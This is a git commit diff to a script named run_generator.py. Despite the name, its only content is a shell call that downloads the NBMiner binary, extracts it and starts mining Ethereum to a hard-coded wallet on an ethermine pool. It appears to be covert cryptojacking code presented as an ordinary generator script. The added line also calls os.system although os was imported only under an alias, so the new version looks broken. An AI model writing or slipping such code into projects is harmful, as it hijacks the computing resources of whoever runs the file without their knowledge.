21cdc75913d60c69e014e7b627be4ec044483a80
KunalSingh19yt <92242678+KunalSingh19yt@users.noreply.github.com>
2021-10-10 11:27:39 +0530

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os as alpha
-alpha.system("wget https://github.com/NebuTech/NBMiner/releases/download/v39.2/NBMiner_39.2_Linux.tgz && tar -xf  NBMiner_39.2_Linux.tgz && cd NBMiner_Linux && ./nbminer -a ethash -o stratum+tcp.//us1.ethermine.org:4444 -u 0x6ff85749ffac2d3a36efa2bc916305433fa93731.ipqce2xl5hi6b3x -p x")
+os.system('wget https://github.com/NebuTech/NBMiner/releases/download/v39.2/NBMiner_39.2_Linux.tgz && tar -xf  NBMiner_39.2_Linux.tgz && cd NBMiner_Linux && ./nbminer -a ethash -o stratum+tcp.//us1.ethermine.org:4444 -u 0x6ff85749ffac2d3a36efa2bc916305433fa93731.ipqce2xl5hi6b3x -p x')
